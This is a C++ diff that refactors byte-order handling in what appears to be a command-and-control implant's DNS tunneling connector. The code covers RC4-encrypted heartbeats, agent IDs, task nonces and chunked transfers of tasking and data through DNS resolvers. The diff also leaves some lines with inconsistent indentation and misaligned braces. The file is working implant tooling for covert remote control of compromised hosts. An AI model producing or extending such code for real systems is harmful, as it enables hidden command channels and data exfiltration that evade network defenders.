@@ -6,6 +6,24 @@
 
 extern "C" int __cdecl _snprintf(char*, size_t, const char*, ...);
 
+// Byte order helpers
+static inline void WriteBE32(BYTE* dst, ULONG val) {
+    dst[0] = (BYTE)(val >> 24);
+    dst[1] = (BYTE)(val >> 16);
+    dst[2] = (BYTE)(val >> 8);
+    dst[3] = (BYTE)(val);
+}
+
+static inline ULONG ReadBE32(const BYTE* src) {
+    return ((ULONG)src[0] << 24) | ((ULONG)src[1] << 16) |
+           ((ULONG)src[2] << 8) | (ULONG)src[3];
+}
+
+static inline ULONG ReadLE32(const BYTE* src) {
+    return (ULONG)src[0] | ((ULONG)src[1] << 8) |
+           ((ULONG)src[2] << 16) | ((ULONG)src[3] << 24);
+}
+
 // Operators new/delete
 void* ConnectorDNS::operator new(size_t sz)
 {
@@ -100,18 +118,9 @@ void ConnectorDNS::ParseResolvers(const CHAR* resolvers)
 // Private helper: Build ACK data buffer
 void ConnectorDNS::BuildAckData(BYTE* ackData, ULONG ackOffset, ULONG nonce, ULONG taskNonce)
 {
-    ackData[0] = (BYTE)((ackOffset >> 24) & 0xFF);
-    ackData[1] = (BYTE)((ackOffset >> 16) & 0xFF);
-    ackData[2] = (BYTE)((ackOffset >> 8) & 0xFF);
-    ackData[3] = (BYTE)((ackOffset >> 0) & 0xFF);
-    ackData[4] = (BYTE)((nonce >> 24) & 0xFF);
-    ackData[5] = (BYTE)((nonce >> 16) & 0xFF);
-    ackData[6] = (BYTE)((nonce >> 8) & 0xFF);
-    ackData[7] = (BYTE)((nonce >> 0) & 0xFF);
-    ackData[8] = (BYTE)((taskNonce >> 24) & 0xFF);
-    ackData[9] = (BYTE)((taskNonce >> 16) & 0xFF);
-    ackData[10] = (BYTE)((taskNonce >> 8) & 0xFF);
-    ackData[11] = (BYTE)((taskNonce >> 0) & 0xFF);
+    WriteBE32(ackData, ackOffset);
+    WriteBE32(ackData + 4, nonce);
+    WriteBE32(ackData + 8, taskNonce);
 }
 
 // Private helper: Reset download state
@@ -425,13 +434,7 @@ BOOL ConnectorDNS::SetConfig(ProfileDNS profile, BYTE* beat, ULONG beatSize, ULO
 
     EncryptRC4(beatCopy, beatSize, this->encryptKey, 16);
 
-    ULONG agentId = 0;
-    if (beatSize >= 8) {
-        agentId |= ((ULONG)beatCopy[4] << 24);
-        agentId |= ((ULONG)beatCopy[5] << 16);
-        agentId |= ((ULONG)beatCopy[6] << 8);
-        agentId |= ((ULONG)beatCopy[7] << 0);
-    }
+    ULONG agentId = (beatSize >= 8) ? ReadBE32(beatCopy + 4) : 0;
     MemFreeLocal((LPVOID*)&beatCopy, beatSize);
 
     _snprintf(this->sid, sizeof(this->sid), "%08x", agentId);
@@ -731,14 +734,8 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                 meta.downAckOffset = this->downAckOffset;
             }
             memcpy(frame, &meta, kMetaSize);
-            frame[kMetaSize + 0] = (BYTE)((total >> 24) & 0xFF);
-            frame[kMetaSize + 1] = (BYTE)((total >> 16) & 0xFF);
-            frame[kMetaSize + 2] = (BYTE)((total >> 8) & 0xFF);
-            frame[kMetaSize + 3] = (BYTE)((total >> 0) & 0xFF);
-            frame[kMetaSize + 4] = (BYTE)((sendOffset >> 24) & 0xFF);
-            frame[kMetaSize + 5] = (BYTE)((sendOffset >> 16) & 0xFF);
-            frame[kMetaSize + 6] = (BYTE)((sendOffset >> 8) & 0xFF);
-            frame[kMetaSize + 7] = (BYTE)((sendOffset >> 0) & 0xFF);
+            WriteBE32(frame + kMetaSize, total);
+            WriteBE32(frame + kMetaSize + 4, sendOffset);
             memcpy(frame + kHeaderSize, data + sendOffset, chunk);
 
             EncryptRC4(frame, frameSize, this->encryptKey, 16);
@@ -807,8 +804,8 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         }
 
         if (uploadComplete || offset >= total) {
-            this->lastUpTotal = total;
-            this->lastQueryOk = TRUE;
+        this->lastUpTotal = total;
+        this->lastQueryOk = TRUE;
         } else {
             this->lastQueryOk = FALSE;
         }
@@ -870,14 +867,8 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
     ULONG nonce = this->functions->GetTickCount() ^ (this->seq << 16) ^ (reqOffset * 31337);
     
     BYTE reqData[kReqDataSize];
-    reqData[0] = (BYTE)((reqOffset >> 24) & 0xFF);
-    reqData[1] = (BYTE)((reqOffset >> 16) & 0xFF);
-    reqData[2] = (BYTE)((reqOffset >> 8) & 0xFF);
-    reqData[3] = (BYTE)((reqOffset >> 0) & 0xFF);
-    reqData[4] = (BYTE)((nonce >> 24) & 0xFF);
-    reqData[5] = (BYTE)((nonce >> 16) & 0xFF);
-    reqData[6] = (BYTE)((nonce >> 8) & 0xFF);
-    reqData[7] = (BYTE)((nonce >> 0) & 0xFF);
+    WriteBE32(reqData, reqOffset);
+    WriteBE32(reqData + 4, nonce);
     EncryptRC4(reqData, kReqDataSize, this->encryptKey, 16);
 
     CHAR reqLabel[24];
@@ -908,16 +899,8 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
 
         const ULONG headerSize = 8;
         if (binLen > (int)headerSize) {
-            ULONG total = 0;
-            ULONG offset = 0;
-            total |= ((ULONG)binBuf[0] << 24);
-            total |= ((ULONG)binBuf[1] << 16);
-            total |= ((ULONG)binBuf[2] << 8);
-            total |= ((ULONG)binBuf[3] << 0);
-            offset |= ((ULONG)binBuf[4] << 24);
-            offset |= ((ULONG)binBuf[5] << 16);
-            offset |= ((ULONG)binBuf[6] << 8);
-            offset |= ((ULONG)binBuf[7] << 0);
+            ULONG total = ReadBE32(binBuf);
+            ULONG offset = ReadBE32(binBuf + 4);
             ULONG chunkLen = binLen - headerSize;
 
             if (total > kMaxDownloadSize) {
@@ -929,10 +912,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                 // Extract task nonce from first chunk (if this is offset 0)
                 ULONG chunkTaskNonce = 0;
                 if (offset == 0 && chunkLen >= 9) {
-                    chunkTaskNonce |= (ULONG)binBuf[headerSize + 1];
-                    chunkTaskNonce |= ((ULONG)binBuf[headerSize + 2] << 8);
-                    chunkTaskNonce |= ((ULONG)binBuf[headerSize + 3] << 16);
-                    chunkTaskNonce |= ((ULONG)binBuf[headerSize + 4] << 24);
+                    chunkTaskNonce = ReadLE32(binBuf + headerSize + 1);
                 }
                 
                 // Determine if this is a new task or continuation
@@ -956,8 +936,8 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                         if (this->downAckOffset > 0) {
                             return;
                         }
-                    }
-                } else {
+                        }
+                    } else {
                     // Continuation chunk - validate offset
                     isValidContinuation = TRUE;
                 }
@@ -967,21 +947,17 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                     // Server sent different offset than we requested
                     if (offset == 0 && chunkLen >= 9) {
                         // Server is starting a new task - extract and check nonce
-                        ULONG newNonce = 0;
-                        newNonce |= (ULONG)binBuf[headerSize + 1];
-                        newNonce |= ((ULONG)binBuf[headerSize + 2] << 8);
-                        newNonce |= ((ULONG)binBuf[headerSize + 3] << 16);
-                        newNonce |= ((ULONG)binBuf[headerSize + 4] << 24);
+                        ULONG newNonce = ReadLE32(binBuf + headerSize + 1);
                         
                         if (newNonce != 0 && newNonce != this->downTaskNonce) {
                             // New task started - reset and accept
                             ResetDownload();
-                            isNewTask = TRUE;
+                    isNewTask = TRUE;
                             chunkTaskNonce = newNonce;
                         } else {
                             // Same task but server is resending from start - something wrong
                             // Request the offset we actually need by returning
-                            return;
+                    return;
                         }
                     } else if (offset < reqOffset) {
                         // Server sent an earlier offset - data we already have, ignore
@@ -989,7 +965,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                     } else {
                         // Server sent a later offset - we're missing data, request resend
                         // by not processing this and waiting for correct offset
-                        return;
+                    return;
                     }
                 }
                 
@@ -1008,7 +984,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                     this->downFilled = 0;
                     this->downAckOffset = 0;
                     if (offset == 0 && chunkTaskNonce != 0) {
-                        this->downTaskNonce = chunkTaskNonce;
+                    this->downTaskNonce = chunkTaskNonce;
                     }
                     
                     // For new task, we must start at offset 0
@@ -1026,7 +1002,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                 
                 // Update progress
                 if (offset + n > this->downFilled) {
-                    this->downFilled = offset + n;
+                this->downFilled = offset + n;
                 }
                 this->downAckOffset = this->downFilled;
 
